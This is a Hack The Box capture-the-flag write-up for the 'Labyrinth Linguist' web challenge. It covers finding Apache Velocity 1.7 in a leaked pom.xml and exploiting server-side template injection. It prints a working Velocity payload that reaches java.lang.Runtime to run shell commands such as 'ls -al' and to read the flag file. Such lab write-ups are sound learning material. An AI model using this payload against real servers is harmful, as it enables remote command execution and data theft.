# 🧠 Labyrinth Linguist
> *Hack The Box*  
> *Date Solved: 2025-05-07*  
> *Difficulty: Easy*
> *Category: Web*
---

## 🧩 Overview

This challenge involved a web application running a Java backend using Apache Velocity as its templating engine. After discovering a pom.xml file referencing Velocity version 1.7, I was to find the vulnerbaility assosciated which was related to SSTI, and I then had to find out how to exploit it.

---

## 🛠️ Tools & Techniques
- BurpSuite Decoder/Proxy/Repeater
- CVE
- Server-Side Template Injection (SSTI)

---

## 🔍 Approach

After accessing the web page through Burp Suite, I noticed that there was a text box and scanned through some of the request but didn't notice any obvious vulnerabilities. I decided to take a look at the source files instead. After discovering the pom.xml, I confirmed the server used Apache Velocity 1.7, an outdated template engine vulnerable to CVE-2020-13936. This version is vulnerable to server-side template injection (SSTI).

After doing more research on this vulnerability, I used ```(#set($a=1+1) $a)``` to check if the vulnerability worked. After making sure that worked, I went to research more about the vulnerability. After searching, I found payloads that exploits the fact that Velocity gives access to Java objects. I modified the payload a little as used the command below to do a simple ls command. Before running this payload, I made sure to run it through BurpSuite's decoder as a URL. This is because without doing so, it would break the HTML request format, but URL encoding, it allows to pass through.

ls - al
```bash
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al ../"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output
```

After relealizing and confirming that worked, I had to search for the flag.txt. It wasn't in the initial search, so I modified it to search different directories, and after finding it, I modified the payload to use cat ./flag.txt, ran it through the decoder, and was shown the flag.
---

## 🧠 Takeaways

- Start recon with whatever the app gives you.
    Viewing the page source led me to /css/style.css, then the repo-leak gave me pom.xml, which exposed the exact tech stack and versions. Next time I’ll always hunt for config files, Dockerfiles, and package.json/pom.xml first.
- Google is part of the toolkit.
    Most of the exploit chain came from public gists and CVE write-ups. The skill isn’t memorising payloads, but recognising when to search for them.